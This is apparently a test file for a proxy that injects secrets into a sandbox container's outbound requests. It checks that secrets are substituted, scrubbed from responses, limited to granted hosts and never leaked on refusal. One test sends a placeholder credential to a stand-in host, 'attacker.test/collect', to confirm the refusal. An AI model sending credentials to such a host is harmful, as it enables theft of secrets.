// Egress interception: the secret reaches the upstream and nothing the
// container can read ever carries it, and the one RPC this path depends on is
// actually reachable.
//
// The reachability test is derived from the SOURCE of the handler rather than a
// hardcoded name, because five cross-DO calls a head makes on its root spent an
// unknown period rejecting fail-closed inside `console.warn`-only background
// work, invisible to a passing suite. A method missing from the surface is not
// a compile error and not a test failure; it is a silent no-op.
import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import {
  EGRESS_PLACEHOLDER_PREFIX, type EgressSecretBinding, type SandboxHandle,
} from '@proteus/core';
import type { EgressInjectionResult } from '../src/user/egress-vault';
import type { OutboundHandlerContext } from '@cloudflare/containers';
import type { ProteusEgressParams } from '../src/egress/outbound';
import { mockAgentsSdk } from './helpers/agents-sdk';
import { jsrpcStub } from './helpers/jsrpc-stub';

// `outbound.ts` imports `getAgentByName` from `agents`, whose module graph
// reaches `cloudflare:email`. One shared mock, then dynamic imports — the same
// ordering every cf-backend DO test uses. The type import above is erased, so
// it loads nothing.
mockAgentsSdk();

const { ORCHESTRATOR_RPC_SURFACE } = await import('../src/rpc-surface');
const {
  CONTAINER_EVENT_HOST, CONTAINER_EVENT_PATH, EGRESS_HANDLER, EVENT_HANDLER,
  handleContainerEgress, parseEgressParams,
} = await import('../src/egress/outbound');
const { configureContainerEgress, withConfiguredEgress } = await import('../src/egress/configure');

const root = new URL('../', import.meta.url).pathname;

/** The handler context the SDK passes: `containerId` and `className` are
 *  platform-supplied, `params` is whatever the owning DO configured. */
function ctx(params: OutboundHandlerContext['params']): OutboundHandlerContext {
  return { containerId: 'container-1', className: 'ProteusSandbox', params };
}
const read = (path: string): string => readFileSync(`${root}${path}`, 'utf8');

const SECRET = 'sk_live_abcdefghij0123456789';
const PLACEHOLDER = `${EGRESS_PLACEHOLDER_PREFIX}${'Q'.repeat(43)}`;
const BINDING: EgressSecretBinding = {
  id: 'stripe', label: 'Stripe', host: 'api.stripe.com', placeholder: PLACEHOLDER,
};
const PARAMS: ProteusEgressParams = {
  workspaceName: 'proteus-main', ownerUserId: 'user-1', bindings: [BINDING],
};

/** An `Env` whose UserDO answers the one vault call, and nothing else.
 *
 *  `get` returns a `jsrpcStub`, not an object literal: the real binding returns a
 *  Proxy whose methods are not own enumerable properties, and a literal double
 *  hid a production TypeError in this exact handler behind a passing test. */
function fakeEnv(resolve: () => EgressInjectionResult): Env {
  const view: Partial<Env> = {};
  Object.assign(view, {
    UserDO: {
      idFromName: (name: string) => name,
      get: () => jsrpcStub({ resolveEgressInjection: async () => resolve() }),
    },
    CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
  });
  // SAFETY: every member the handler reads is constructed by the Object.assign
  // above — `UserDO.idFromName`, `UserDO.get` and `CREDENTIAL_ENCRYPTION_KEY` are
  // the complete set `handleContainerEgress` touches, which its body declares
  // directly, so no unassigned binding is reachable at runtime.
  return view as Env;
}

interface FetchCapture {
  readonly seen: Request[];
  readonly restore: () => void;
}

/** Capture what actually left toward the upstream. */
function captureFetch(response: () => Response): FetchCapture {
  const seen: Request[] = [];
  const original = globalThis.fetch;
  const stub: typeof globalThis.fetch = Object.assign(
    async (input: Parameters<typeof globalThis.fetch>[0], init?: Parameters<typeof globalThis.fetch>[1]) => {
      const request = input instanceof Request ? input : new Request(String(input), init);
      seen.push(request);
      return response();
    },
    { preconnect: original.preconnect },
  );
  globalThis.fetch = stub;
  return { seen, restore: () => { globalThis.fetch = original; } };
}

/** A handle whose only exercised member is `exec` — `withConfiguredEgress`
 *  spreads the rest through untouched. */
function execOnlyHandle(): SandboxHandle {
  const view: Partial<SandboxHandle> = {};
  Object.assign(view, { exec: async () => ({ stdout: 'done', stderr: '', exitCode: 0 }) });
  // SAFETY: `exec` is constructed above and is the only member these two tests
  // invoke; `withConfiguredEgress` preserves the rest of the handle by spreading
  // it rather than enumerating it, so no unassigned member is reachable.
  return view as SandboxHandle;
}

describe('the secret reaches the upstream and comes back scrubbed', () => {
  test('the placeholder becomes the secret on the wire to the bound host', async () => {
    const upstream = captureFetch(() => new Response('ok'));
    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', {
          method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}` },
        }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS,
      );
      expect(response.status).toBe(200);
      expect(upstream.seen).toHaveLength(1);
      expect(upstream.seen[0]!.headers.get('authorization')).toBe(`Bearer ${SECRET}`);
      // Redirects must not be followed: the default would replay the injected
      // credential against whatever host the upstream names.
      expect(upstream.seen[0]!.redirect).toBe('manual');
    } finally { upstream.restore(); }
  });

  test('an echoed secret is scrubbed out of the body, headers and status text', async () => {
    const upstream = captureFetch(() => new Response(
      `invalid api key: ${SECRET}`,
      {
        status: 401,
        statusText: `rejected ${SECRET}`,
        headers: { 'www-authenticate': `Bearer error="${SECRET}"`, location: `/retry?k=${SECRET}` },
      },
    ));
    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS,
      );
      const body = await response.text();
      expect(body).not.toContain(SECRET);
      expect(body).toContain(PLACEHOLDER);
      expect(response.headers.get('www-authenticate')).not.toContain(SECRET);
      expect(response.headers.get('location')).not.toContain(SECRET);
      expect(response.statusText).not.toContain(SECRET);
    } finally { upstream.restore(); }
  });

  test('a refusal names no secret', async () => {
    const response = await handleContainerEgress(
      new Request('https://attacker.test/collect', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
      fakeEnv(() => ({ kind: 'refuse', status: 403, reason: 'bound to api.stripe.com' })),
      PARAMS,
    );
    expect(response.status).toBe(403);
    expect(await response.text()).not.toContain(SECRET);
  });

  test('an unconfigured container is refused, never forwarded', async () => {
    const upstream = captureFetch(() => new Response('should not happen'));
    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/'), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), undefined,
      );
      expect(response.status).toBe(503);
      expect(upstream.seen).toHaveLength(0);
    } finally { upstream.restore(); }
  });

  test('traffic with no placeholder is forwarded untouched', async () => {
    const upstream = captureFetch(() => new Response('ok'));
    try {
      await handleContainerEgress(
        new Request('https://example.com/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
        PARAMS,
      );
      expect(upstream.seen[0]!.url).toBe('https://example.com/');
      expect(upstream.seen[0]!.headers.get('authorization')).toBeNull();
    } finally { upstream.restore(); }
  });
});

describe('what the container is configured with', () => {
  test('only GRANTED bindings are passed, so an ungranted placeholder is never learned', async () => {
    const calls: { host?: string; method: string; params: ProteusEgressParams }[] = [];
    const params = await configureContainerEgress({
      setOutboundHandler: async (method, p) => { calls.push({ method, params: p }); },
      setOutboundByHost: async (host, method, p) => { calls.push({ host, method, params: p }); },
    }, {
      workspaceName: 'proteus-main',
      ownerUserId: 'user-1',
      vault: [BINDING, { id: 'prod-db', label: 'Prod DB', host: 'db.internal', placeholder: `${EGRESS_PLACEHOLDER_PREFIX}${'Z'.repeat(43)}` }],
      grants: [{ rule: 'egress-secret:stripe', executor: 'sandbox' }],
    });
    expect(params.bindings.map((b) => b.id)).toEqual(['stripe']);
    // The event host is bound BEFORE the catch-all, so no container event ever
    // takes the egress path.
    expect(calls[0]).toMatchObject({ host: CONTAINER_EVENT_HOST, method: EVENT_HANDLER });
    expect(calls[1]).toMatchObject({ method: EGRESS_HANDLER });
    expect(JSON.stringify(params)).not.toContain('prod-db');
  });

  test('a grant on another executor does not widen the container', async () => {
    const params = await configureContainerEgress(
      { setOutboundHandler: async () => {}, setOutboundByHost: async () => {} },
      {
        workspaceName: 'w', ownerUserId: 'u', vault: [BINDING],
        grants: [{ rule: 'egress-secret:stripe', executor: 'laptop' }],
      },
    );
    expect(params.bindings).toEqual([]);
  });

  test('params are parsed, so a malformed configuration reads as unconfigured', () => {
    expect(parseEgressParams(ctx(PARAMS))).toEqual(PARAMS);
    expect(parseEgressParams(ctx({ workspaceName: 'w' }))).toBeUndefined();
    expect(parseEgressParams(ctx(undefined))).toBeUndefined();
  });
});

describe('configuration is awaited before the container runs', () => {
  test('the first operation configures once, and concurrent callers share it', async () => {
    let configured = 0;
    let released: () => void = () => {};
    const gate = new Promise<void>((resolve) => { released = resolve; });
    const handle = withConfiguredEgress(
      execOnlyHandle(),
      async () => { configured += 1; await gate; },
    );
    const both = Promise.all([handle.exec('a'), handle.exec('b')]);
    released();
    expect((await both).map((r) => r.stdout)).toEqual(['done', 'done']);
    expect(configured).toBe(1);
  });

  test('a failed configuration is not cached, so the next call retries', async () => {
    let attempts = 0;
    const handle = withConfiguredEgress(
      execOnlyHandle(),
      async () => { attempts += 1; if (attempts === 1) throw new Error('root unreachable'); },
    );
    await expect(handle.exec('a')).rejects.toThrow('root unreachable');
    expect((await handle.exec('a')).stdout).toBe('done');
    expect(attempts).toBe(2);
  });
});

describe('reachability of the container event channel', () => {
  // Derived from the handler's own source, not restated: the point is that
  // adding a call here without allowlisting it must fail.
  test('every OrchestratorAgent method the egress layer calls is on the RPC surface', () => {
    const handler = read('src/egress/outbound.ts');
    const called = [...handler.matchAll(/\bagent\.(\w+)\(/g)].map(([, name]) => name!);
    expect(called.length).toBeGreaterThan(0);
    expect([...new Set(called)].filter((name) => !ORCHESTRATOR_RPC_SURFACE.includes(name))).toEqual([]);
  });

  test('the method the channel calls actually exists on the orchestrator', () => {
    expect(read('src/orchestrator.ts')).toContain('async acceptContainerEvent(');
  });

  test('the event channel has exactly one route, on a name that resolves nowhere public', () => {
    expect(CONTAINER_EVENT_HOST.endsWith('.internal')).toBe(true);
    expect(CONTAINER_EVENT_PATH.startsWith('/')).toBe(true);
  });
});

describe('the posture the whole design rests on', () => {
  test('ContainerProxy is exported from the Worker entry', () => {
    // Without it `applyOutboundInterception` throws and NOTHING is intercepted,
    // while the vault still believes it is substituting.
    expect(read('src/server.ts')).toMatch(/export\s*\{[^}]*\bContainerProxy\b[^}]*\}/);
  });

  test('the container class denies non-HTTP egress and intercepts HTTPS', () => {
    const source = read('src/proteus-sandbox.ts');
    expect(source).toContain('enableInternet = false');
    // The SDK does NOT default this on, whatever its docs say.
    expect(source).toContain('interceptHttps = true');
  });

  test('the SDK still leaves HTTPS interception off by default', () => {
    // Re-measured so the comments asserting it cannot quietly rot. If upstream
    // fixes the default this fails and the comments get updated.
    const bundle = readFileSync(
      `${root}../../node_modules/@cloudflare/containers/dist/lib/container.js`, 'utf8',
    );
    expect(bundle).toContain('interceptHttps = false');
  });
});

// A JSRPC stub is a Proxy: its methods come from a `get` trap, so they are not
// own enumerable properties and `Object.assign`/spread copy NOTHING off it.
//
// Three sites did that and were measured throwing on production
// (`resolveEgressInjection`, `listEgressSecrets`, `acceptContainerEvent`); the
// fourth, `runtime.ts`'s `rootView`, is the same pattern and was never observed
// firing.
//
// A source-level detector used to live here, scoped to two files by regex. The
// `anti-slop/no-copy-rpc-stub` oxlint rule replaced it: same defect, matched on
// the AST across the whole repo and gated by `bun run lint`. What stays here is
// the one thing a linter cannot assert — that the double these tests run
// against really does behave like a stub.
describe('a stub is used, never copied', () => {
  test('the double is faithful in the way that matters: copying it loses everything', () => {
    // The premise, asserted rather than described. If a future runtime made
    // spreading a stub work, this fails and the doubles above stop being
    // evidence about production.
    const stub = jsrpcStub({ method: () => 'value' });
    expect(Object.keys({ ...stub })).toEqual([]);
    // ...while the stub itself answers, so the double is not merely broken.
    expect(stub.method()).toBe('value');
  });
});
